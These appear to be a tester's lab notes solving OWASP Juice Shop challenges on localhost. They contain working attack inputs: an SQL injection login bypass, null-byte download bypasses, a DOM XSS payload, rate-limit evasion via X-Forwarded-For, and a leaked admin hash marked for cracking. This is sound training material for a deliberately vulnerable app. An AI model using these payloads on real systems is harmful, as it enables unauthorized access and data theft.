# OWASP Juice Shop Working Notes

Target: OWASP Juice Shop  
URL: `http://localhost:3000`  
Date: 2026-05-04  
Tester: Max  
Purpose: Track reconnaissance, solved challenges, commands, evidence, and next attack paths.

## Current Status

The application is reachable on port `3000` and has been confirmed as OWASP Juice Shop. Admin access was obtained through SQL injection login bypass. The hidden scoreboard was found, `/ftp` was enumerated, backup files were downloaded with a poison null byte bypass, the encrypted token sale announcement was decrypted, DOM XSS was triggered, notification behavior was inspected, and several authentication/API clues were captured in Burp.

Solved so far:

| Challenge | Category | How it was solved |
| --- | --- | --- |
| Error Handling | Security Misconfiguration | Triggered an unhandled application/API error during early probing. |
| Login Admin | Injection | Logged in as administrator using SQL injection in the login form. |
| Admin Section | Broken Access Control | Browsed to `/#/administration` after becoming admin. |
| Score Board | Miscellaneous | Found and opened `/#/score-board`. |
| Bully Chatbot | Miscellaneous | Obtained a coupon from the support chatbot. |
| Five-Star Feedback | Broken Access Control | Used admin access to remove 5-star feedback. |
| Poison Null Byte | Improper Input Validation | Downloaded restricted backup files from `/ftp` with `%2500.md`. |
| Forgotten Developer Backup | Sensitive Data Exposure | Downloaded `package.json.bak` via the poison null byte bypass. |
| Forgotten Sales Backup | Sensitive Data Exposure | Downloaded `coupons_2013.md.bak` via the poison null byte bypass. |
| Blockchain Hype | Security through Obscurity | Decrypted `announcement_encrypted.md` and opened the hidden token sale route. |
| DOM XSS | XSS | Injected the iframe JavaScript payload into the vulnerable frontend route and triggered the challenge notification. |
| Mass Dispel | Miscellaneous | Restarted the server to recreate multiple challenge notifications, then used the notification convenience close-all behavior. |
| Reset Morty's Password | Broken Anti Automation | Used Morty's obfuscated favorite pet answer instead of SQL injection. |

## Reconnaissance

Nmap identified one exposed service:

```text
3000/tcp open ppp?
```

The service fingerprint showed HTTP headers and HTML proving this is Juice Shop:

```text
HTTP/1.1 200 OK
<title>OWASP Juice Shop</title>
X-Recruiting: /#/jobs
```

The browser target is:

```text
http://localhost:3000
```

## Directory Discovery

Initial Gobuster against `http://TARGET:3000` failed because `TARGET` was a placeholder. Running against localhost worked, but Juice Shop returns the Angular single-page app for unknown frontend routes, producing false-positive `200` responses with length `75002`.

Working command:

```bash
gobuster dir \
  -u http://localhost:3000 \
  -w /usr/share/wordlists/dirb/common.txt \
  --exclude-length 75002
```

Interesting results:

```text
/api                  (Status: 500)
/apis                 (Status: 500)
/assets               (Status: 301)
/ftp                  (Status: 200)
/media                (Status: 301)
/profile              (Status: 500)
/promotion            (Status: 200)
/redirect             (Status: 500)
/rest                 (Status: 500)
/robots.txt           (Status: 200)
/video                (Status: 200)
/Video                (Status: 200)
```

Useful manual endpoints:

```text
http://localhost:3000/#/score-board
http://localhost:3000/#/administration
http://localhost:3000/ftp/
http://localhost:3000/robots.txt
http://localhost:3000/api/Challenges
http://localhost:3000/api/Users
http://localhost:3000/rest/admin/application-configuration
http://localhost:3000/rest/products/search?q=
```

## Admin Login

Admin access was obtained through SQL injection in the login form.

Payload used:

```text
Email: ' or 1=1--
Password: anything
```

After login, the admin section was accessible:

```text
http://localhost:3000/#/administration
```

This solved:

```text
Login Admin
Admin Section
```

## Scoreboard Discovery

The hidden scoreboard was opened at:

```text
http://localhost:3000/#/score-board
```

The API challenge list can also be pulled directly:

```bash
curl http://localhost:3000/api/Challenges
```

This solved:

```text
Score Board
```

## FTP Enumeration

The `/ftp` route looked empty in the browser, but direct HTML parsing showed exposed files:

```bash
curl -s http://localhost:3000/ftp/ | grep -Eo 'href="[^"]+"'
```

Files found:

```text
href="."
href="quarantine"
href="acquisitions.md"
href="announcement_encrypted.md"
href="coupons_2013.md.bak"
href="eastere.gg"
href="encrypt.pyc"
href="incident-support.kdbx"
href="legal.md"
href="package-lock.json.bak"
href="package.json.bak"
href="suspicious_errors.yml"
```

The quarantine folder also exposed shortcut files:

```bash
curl -s http://localhost:3000/ftp/quarantine/ | grep -Eo 'href="[^"]+"'
```

Output:

```text
href="./.."
href="."
href="."
href="juicy_malware_linux_amd_64.url"
href="juicy_malware_linux_arm_64.url"
href="juicy_malware_macos_64.url"
href="juicy_malware_windows_64.exe.url"
```

## Poison Null Byte Download Bypass

Restricted backup files were downloaded by appending a double-encoded null byte plus an allowed extension.

Commands:

```bash
curl -O "http://localhost:3000/ftp/package.json.bak%2500.md"
curl -O "http://localhost:3000/ftp/package-lock.json.bak%2500.md"
curl -O "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"
curl -O "http://localhost:3000/ftp/incident-support.kdbx%2500.md"
curl -O "http://localhost:3000/ftp/encrypt.pyc%2500.md"
```

This solved:

```text
Poison Null Byte
Forgotten Developer Backup
Forgotten Sales Backup
```

Coupon file output contained codes such as:

```text
n<MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
```

## Token Sale Crypto

The encrypted announcement was downloaded:

```bash
curl -s http://localhost:3000/ftp/announcement_encrypted.md -o announcement_encrypted.md
```

The paired bytecode file contained useful strings:

```bash
strings encrypt.pyc%2500.md | head -80
```

Important strings:

```text
announcement.md
announcement_encrypted.md
confidential_document
encrypted_document
pow
ord
encrypt.py
```

Initial attempts with `sqrt(ciphertext)` and plain `pow(ord(char), exponent)` failed because the ciphertext uses RSA-style modular exponentiation. The working decryptor precomputed the ciphertext for printable characters using known RSA public parameters:

```bash
python3 - <<'PY'
from pathlib import Path

N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
e = 65537

charset = [chr(i) for i in range(33, 127)] + [" ", "\n", "\t"]
lookup = {str(pow(ord(c), e, N)): c for c in charset}

out = []
for line in Path("announcement_encrypted.md").read_text().splitlines():
    out.append(lookup.get(line.strip(), "?"))

print("".join(out))
PY
```

Decrypted result exposed:

```text
Major Announcement:

Token Sale - Initial Coin Offering
...
URL: /#/tokensale-ico-ea
```

Opening the route solved the token sale challenge:

```text
http://localhost:3000/#/tokensale-ico-ea
```

This solved:

```text
Blockchain Hype
```

## Application Visibility

Useful commands and workflows for seeing how the app works:

```bash
curl http://localhost:3000/robots.txt
curl http://localhost:3000/api/Challenges
curl http://localhost:3000/api/Users
curl http://localhost:3000/rest/admin/application-configuration
```

Browser DevTools:

- Application tab: inspect Local Storage and JWT/session values.
- Network tab: filter for `api`, `rest`, `graphql`, `socket`.
- Sources tab: inspect bundled JavaScript for hidden routes and client-side secrets.

Burp/ZAP proxy:

```text
HTTP proxy: 127.0.0.1
Port: 8080
```

Docker/container visibility, if running locally:

```bash
docker ps
docker logs -f <container_id>
docker exec -it <container_id> sh
```

## Feedback API Findings

The feedback API returns JSON with customer feedback records and several useful clues.

Notable response headers:

```text
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
```

Important observations from the response:

```json
{
  "UserId": 21,
  "id": 4,
  "comment": "Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\" (***ereum@juice-sh.op)",
  "rating": 1
}
```

This looks useful for Web3/NFT-related challenges:

```text
NFT Takeover
Mint the Honey Pot
Wallet Depletion
Web3 Sandbox
```

The same feedback response also contains an upload clue:

```json
{
  "UserId": null,
  "id": 5,
  "comment": "Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em> (anonymous)",
  "rating": 2
}
```

This suggests the complaint upload feature expects order confirmation PDFs and may be the correct place to test:

```text
Upload Size
Upload Type
XXE Data Access
XXE DoS
Memory Bomb
```

Feedback records also show user IDs, masked emails, comments, ratings, and timestamps. This is useful for access-control and API-only testing:

```text
Forged Feedback
API-only XSS
Server-side XSS Protection
CAPTCHA Bypass
Zero Stars
```

## JWT and Authorization Findings

Burp captured authenticated requests containing both an `Authorization: Bearer` header and a `token` cookie. The decoded JWT payload exposed sensitive user fields for the admin account:

```text
email: admin@juice-sh.op
role: admin
password: 0192023a7bbd73250516f069df18b500
```

This is relevant to:

```text
Password Hash Leak
Exposed credentials
JWT-related challenges
Authorization testing
```

Important request behavior:

```text
OWASP Juice Shop (Express ^4.22.1)
401 UnauthorizedError: No Authorization header was found
```

That error confirms some REST/API endpoints require the bearer token header, not only browser cookies. When replaying authenticated requests in Burp Repeater, include:

```http
Authorization: Bearer <jwt>
Cookie: token=<jwt>; language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss
Content-Type: application/json
```

## XSS Notes

The DOM XSS payload that solved the tutorial challenge was:

```text
<iframe src="javascript:alert(`xss`)">
```

URL-encoded form:

```text
%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
```

Correct route:

```text
http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
```

Incorrect route that only rendered text:

```text
http://localhost:3000/#/track-result/new?id=<payload>
```

Challenge notification observed after successful DOM XSS:

```text
You successfully solved a challenge: DOM XSS (Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">.)
```

Bonus payload for the SoundCloud challenge should also be tested through the vulnerable search route, fully URL-encoded:

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

Feedback submission captured in Burp:

```json
{
  "UserId": 1,
  "captchaId": 4,
  "captcha": "21",
  "comment": "<iframe src=\"javascript:alert(`xss`)\">. (***in@juice-sh.op)",
  "rating": 2
}
```

This request is useful for API-only/persisted XSS testing, but it is a different path than the DOM XSS route.

## Password Reset Notes

Morty's password reset is not solved with SQL injection in the answer field. The challenge expects the obfuscated original answer to the security question.

Failed attempt:

```json
{
  "email": "morty@juice-sh.op",
  "answer": "1=1--",
  "new": "Admin1!!",
  "repeat": "Admin1!!"
}
```

Working answer:

```text
5N0wb41L
```

Working request body:

```json
{
  "email": "morty@juice-sh.op",
  "answer": "5N0wb41L",
  "new": "Admin1!!",
  "repeat": "Admin1!!"
}
```

Endpoint:

```http
POST /rest/user/reset-password
Host: localhost:3000
Content-Type: application/json
```

If the endpoint blocks repeated attempts, rotate the test IP header in Burp:

```http
X-Forwarded-For: 127.0.0.123
```

## Notifications and Mass Dispel

Challenge-solved notifications are client-side UI elements that appear when a challenge transitions from unsolved to solved. Replaying the same API request in Burp does not reliably recreate a solved notification once the challenge is already marked solved.

Observed notification element:

```html
<mat-card class="mat-mdc-card mdc-card accent-notification ...">
  <div class="notificationMessage">
    <div class="contents">You successfully solved a challenge: DOM XSS ...</div>
  </div>
</mat-card>
```

The Mass Dispel challenge is easiest immediately after restarting the Juice Shop instance and accumulating several solved-challenge notifications. The convenience behavior is to hold `Shift` and click the close button on one notification to close multiple notifications at once.

Server restart options:

```bash
docker ps
docker restart <container_id>
```

Fresh Docker reset:

```bash
docker rm -f <container_id>
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Local npm restart:

```bash
Ctrl+C
npm start
```

## Web3 Wallet Setup

The Web3 challenges require a browser wallet such as MetaMask. Install the extension from:

```text
https://metamask.io/download/
```

Then refresh:

```text
http://localhost:3000
```

When Juice Shop prompts for wallet access, approve the MetaMask connection for the local lab.

NFT clue captured from feedback:

```text
purpose betray marriage blame crunch monitor spin slide donate sport lift clutch
```

Use this only inside the local Juice Shop lab. It appears connected to `/juicy-nft` and the NFT/Web3 challenge path.

## File Upload Lead

There are upload-related challenges:

```text
Upload Size - Upload a file larger than 100 kB.
Upload Type - Upload a file that has no .pdf or .zip extension.
XXE Data Access - Retrieve /etc/passwd or C:\Windows\system.ini.
XXE DoS - Give the server something expensive to parse.
Memory Bomb - Drop explosive data into a vulnerable file-handling endpoint.
SSTi - Abuse arbitrary command execution to infect the server with juicy malware.
```

The upload feature may help with XML/YAML/file validation challenges, but a real reverse shell is not usually the main Juice Shop path. The safer next step is to identify the upload endpoint in DevTools/Burp, confirm accepted extensions and content types, then target the explicit upload challenges.

Record the upload endpoint here once found:

```text
Endpoint:
Method:
Content-Type:
Accepted extensions:
Max size behavior:
Response:
```

## Next High-Value Targets

Good next challenges to target:

| Challenge | Why it is a good next target |
| --- | --- |
| Password Hash Leak | Already admin; API excessive data exposure likely makes this quick. |
| Confidential Document | `/ftp/acquisitions.md` is exposed and should be tested directly. |
| Database Schema | Login/search SQLi path already confirmed. |
| User Credentials | Same SQLi path can likely exfiltrate users. |
| View Basket | Broken access control, usually ID manipulation. |
| Manipulate Basket | Builds on basket ID abuse. |
| Upload Size | Directly related to the discovered upload feature. |
| Upload Type | Directly related to upload validation bypass. |
| XXE Data Access | Likely via upload/import functionality. |
| Exposed Metrics | Easy observability endpoint discovery. |
| Privacy Policy | Easy low-difficulty completion. |
| Zero Stars | Input validation on feedback rating. |
| Bonus Payload | Builds directly on the confirmed DOM XSS search route. |
| API-only XSS | Feedback API payload submission path is already captured in Burp. |
| NFT Takeover | Feedback API leaked a mnemonic phrase and `/juicy-nft` route clue. |

## Evidence Log

| Evidence ID | Date | Finding | Type | Location / Command |
| --- | --- | --- | --- | --- |
| EVID-001 | 2026-05-04 | Service identification | Nmap | `nmap -sV -p 3000 localhost` |
| EVID-002 | 2026-05-04 | Directory discovery | Gobuster | `gobuster dir -u http://localhost:3000 ... --exclude-length 75002` |
| EVID-003 | 2026-05-04 | FTP listing | curl | `curl -s http://localhost:3000/ftp/ \| grep -Eo 'href="[^"]+"'` |
| EVID-004 | 2026-05-04 | Quarantine listing | curl | `curl -s http://localhost:3000/ftp/quarantine/ \| grep -Eo 'href="[^"]+"'` |
| EVID-005 | 2026-05-04 | Null byte bypass | curl | `curl -O "...bak%2500.md"` |
| EVID-006 | 2026-05-04 | Crypto source hints | strings | `strings encrypt.pyc%2500.md \| head -80` |
| EVID-007 | 2026-05-04 | Token sale route | Python decrypt | RSA character lookup decryptor |
| EVID-008 | 2026-05-04 | Challenge inventory | API | `curl http://localhost:3000/api/Challenges` |
| EVID-009 | 2026-05-04 | Feedback API clues | API/Burp | Feedback JSON exposed NFT mnemonic and complaint upload hint |
| EVID-010 | 2026-05-04 | DOM XSS | Browser | `/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E` |
| EVID-011 | 2026-05-04 | JWT password hash exposure | Burp | Bearer JWT decoded to admin fields and hash |
| EVID-012 | 2026-05-04 | Morty password reset answer | API/Burp | `POST /rest/user/reset-password` with answer `5N0wb41L` |
| EVID-013 | 2026-05-04 | Notification behavior | Browser DevTools | DOM XSS solved notification inspected as Angular Material `mat-card` |
| EVID-014 | 2026-05-04 | Web3 NFT clue | Feedback API | Seed phrase and `/juicy-nft` route found in feedback record |

## Rough Notes

- Unknown Angular routes return HTTP `200` with the app shell, so directory brute forcing needs response-length filtering.
- `/ftp` is a real sensitive data source even when the browser UI looks empty.
- `%2500.md` bypassed extension restrictions on backup files.
- The token sale route came from decrypted announcement content, not from brute forcing routes.
- Feedback API response exposed a Web3 mnemonic clue and a complaint upload hint.
- Upload functionality should be inspected with Burp before assuming it can lead to command execution.
- Authenticated API replay may require the `Authorization: Bearer <jwt>` header even when the browser also has a token cookie.
- Possible admin password hash to crack: `0192023a7bbd73250516f069df18b500`.
